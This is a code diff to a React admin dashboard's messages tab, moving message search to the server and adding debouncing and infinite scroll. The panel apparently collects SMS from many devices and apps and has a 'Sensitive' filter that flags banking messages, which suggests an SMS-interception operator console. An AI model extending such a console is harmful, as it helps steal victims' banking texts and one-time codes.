@@ -528,56 +528,68 @@ function MsgCard({ msg, appColor }: { msg: MsgRow; appColor: string }) {
 function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
   const [msgs, setMsgs] = useState<MsgRow[]>([]);
   const [loading, setLoading] = useState(false);
+  const [searching, setSearching] = useState(false);
   const [appFilter, setAppFilter] = useState("");
   const [search, setSearch] = useState("");
   const [sensitiveOnly, setSensitiveOnly] = useState(false);
   const [visibleCount, setVisibleCount] = useState(30);
   const sentinelRef = useRef<HTMLDivElement>(null);
-  const filteredLenRef = useRef(0);
 
-  const fetchMsgs = useCallback(async () => {
-    setLoading(true);
-    setVisibleCount(30);
+  /* Debounce search — 400ms so server isn't hammered on each keystroke */
+  const [debouncedSearch, setDebouncedSearch] = useState("");
+  useEffect(() => {
+    const t = setTimeout(() => setDebouncedSearch(search.trim()), 400);
+    return () => clearTimeout(t);
+  }, [search]);
+
+  /* Browse mode: no search — fetch latest 5000 messages once */
+  const fetchBrowse = useCallback(async () => {
+    setLoading(true); setVisibleCount(30);
     try {
       const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}&limit=5000` : "?limit=5000";
       const r = await apiFetch(`/api/messages${qs}`, { headers: { "x-master-pin": masterPin } });
-      if (r.ok) {
-        const data = await r.json() as MsgRow[];
-        setMsgs(data.sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime()));
-      }
+      if (r.ok) setMsgs((await r.json() as MsgRow[]).sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime()));
     } catch { } finally { setLoading(false); }
   }, [appFilter, masterPin]);
 
-  useEffect(() => { void fetchMsgs(); }, [fetchMsgs]);
+  /* Search mode: pass search term to server — searches ALL rows in DB */
+  const fetchSearch = useCallback(async (term: string) => {
+    setSearching(true); setVisibleCount(30);
+    try {
+      const params = new URLSearchParams({ search: term });
+      if (appFilter) params.set("appId", appFilter);
+      const r = await apiFetch(`/api/messages?${params}`, { headers: { "x-master-pin": masterPin } });
+      if (r.ok) setMsgs((await r.json() as MsgRow[]).sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime()));
+    } catch { } finally { setSearching(false); }
+  }, [appFilter, masterPin]);
 
+  /* Trigger correct fetch based on whether search is active */
+  useEffect(() => {
+    if (debouncedSearch) void fetchSearch(debouncedSearch);
+    else void fetchBrowse();
+  }, [debouncedSearch, fetchBrowse, fetchSearch]);
+
+  /* Client-side sensitive filter only (text search is now server-side) */
   const filtered = useMemo(() => {
-    let list = msgs;
-    if (sensitiveOnly) list = list.filter(m => isBankingMsg(m.body, m.fromSender) || m.isSensitive);
-    const q = search.trim().toLowerCase();
-    if (q) list = list.filter(m =>
-      m.fromNumber.includes(q) ||
-      m.fromSender.toLowerCase().includes(q) ||
-      m.body.toLowerCase().includes(q) ||
-      m.deviceId.toLowerCase().includes(q) ||
-      m.appId.toLowerCase().includes(q)
-    );
-    filteredLenRef.current = list.length;
-    return list;
-  }, [msgs, sensitiveOnly, search]);
+    if (!sensitiveOnly) return msgs;
+    return msgs.filter(m => isBankingMsg(m.body, m.fromSender) || m.isSensitive);
+  }, [msgs, sensitiveOnly]);
 
-  useEffect(() => { setVisibleCount(30); filteredLenRef.current = 0; }, [search, sensitiveOnly, appFilter]);
+  useEffect(() => { setVisibleCount(30); }, [filtered.length]);
 
+  /* Infinite scroll */
   useEffect(() => {
     const el = sentinelRef.current;
     if (!el) return;
     const obs = new IntersectionObserver(entries => {
-      if (entries[0].isIntersecting) setVisibleCount(c => Math.min(c + 30, filteredLenRef.current || msgs.length));
+      if (entries[0].isIntersecting) setVisibleCount(c => Math.min(c + 30, filtered.length));
     }, { rootMargin: "300px" });
     obs.observe(el);
     return () => obs.disconnect();
-  }, [msgs.length]);
+  }, [filtered.length]);
 
   const visible = useMemo(() => filtered.slice(0, visibleCount), [filtered, visibleCount]);
+  const isLoading = loading || searching;
 
   const appColors = useMemo(() => {
     const colors: Record<string, string> = {};
@@ -589,14 +601,15 @@ function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
 
   return (
     <div style={{ padding: "10px 0", display: "flex", flexDirection: "column", gap: 10 }}>
-      {/* Toolbar — same layout as sub admin */}
       <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
         <AppSelector apps={apps} value={appFilter} onChange={v => setAppFilter(v)} />
         <div style={{ flex: 1, minWidth: 200, background: T.card, border: `1px solid ${T.borderLight}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
           <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
-          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search messages…"
+          <input value={search} onChange={e => setSearch(e.target.value)}
+            placeholder="Search across ALL messages in DB…"
             style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: T.text }} />
-          {search && <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 14, padding: 0 }}>✕</button>}
+          {searching && <Spinner size={12} />}
+          {search && !searching && <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 14, padding: 0 }}>✕</button>}
         </div>
         <button onClick={() => setSensitiveOnly(v => !v)} style={{
           padding: "8px 12px", borderRadius: 8, border: "1.5px solid",
@@ -605,19 +618,22 @@ function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
           color: sensitiveOnly ? T.red : T.muted,
           fontSize: 11, fontWeight: 600, cursor: "pointer",
         }}>Sensitive</button>
-        <button onClick={() => void fetchMsgs()} disabled={loading} style={{ padding: "8px 12px", borderRadius: 8, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 5 }}>
-          {loading ? <Spinner /> : <Ic.Refresh />} Refresh
+        <button onClick={() => debouncedSearch ? void fetchSearch(debouncedSearch) : void fetchBrowse()} disabled={isLoading} style={{ padding: "8px 12px", borderRadius: 8, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: isLoading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 5 }}>
+          {isLoading ? <Spinner /> : <Ic.Refresh />} Refresh
         </button>
       </div>
 
       <div style={{ fontSize: 10, color: "#64748b" }}>
-        {filtered.length !== msgs.length ? `${filtered.length} of ` : ""}{msgs.length} message{msgs.length !== 1 ? "s" : ""}
+        {debouncedSearch
+          ? <><span style={{ color: T.accentLight }}>🔍 DB search:</span> {filtered.length} result{filtered.length !== 1 ? "s" : ""} for "{debouncedSearch}"</>
+          : <>{filtered.length !== msgs.length ? `${filtered.length} of ` : ""}{msgs.length} message{msgs.length !== 1 ? "s" : ""}</>
+        }
         {visibleCount < filtered.length && <span> · showing {visibleCount}</span>}
       </div>
 
-      {loading && msgs.length === 0 ? (
+      {isLoading && msgs.length === 0 ? (
         <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
-          <Spinner /><span style={{ fontSize: 13, color: "#94a3b8" }}>Loading messages…</span>
+          <Spinner /><span style={{ fontSize: 13, color: "#94a3b8" }}>{debouncedSearch ? "Searching all messages…" : "Loading messages…"}</span>
         </div>
       ) : filtered.length === 0 ? (
         <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>
